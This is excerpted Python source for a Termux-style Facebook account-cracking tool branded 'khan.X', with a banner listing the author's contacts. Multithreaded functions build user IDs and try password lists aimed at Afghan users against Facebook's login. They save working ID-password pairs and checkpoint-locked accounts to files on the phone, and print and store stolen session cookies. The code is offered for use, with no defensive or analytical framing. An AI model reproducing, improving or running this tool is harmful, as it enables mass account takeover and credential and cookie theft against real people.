#DECODE/BY/SaManDar
#khan.X
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.https://www.facebook.com/asadullah.shirzad.56')
...
os.system('xdg-openhttps://www.facebook.com/asadullah.shirzad.56')
...
db   dD db   db  .d8b.  d8b   db 
88 ,8P' 88   88 d8' `8b 888o  88 
88,8P   88ooo88 88ooo88 88V8o 88 
88`8b   88~~~88 88~~~88 88 V8o88 
88 `88. 88   88 88   88 88  V888 
YP   YD YP   YP YP   YP VP   V8P 
            
                           
================================================
\033[1;31m================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{khan.X}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{ khan.X}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{khan.X}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{khan.X}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{0703884083}\33[0;m
...
\033[1;31m================================================
\33[37;41m\t WELLCOME TO khan.X TOOLS\33[0;m
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [khan.X-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [khan.X-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/khan.X-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [khan.X-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/khan.X-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/khan.X-CP.txt','a').write(ids+'|'+pas+'\n')
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','Afghan100200','Afghan1234','Afghan@@@123','afghanistan','Afghanistan','50005000']
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [khan.X]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [khan.X==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/khan.X-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/khan.X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
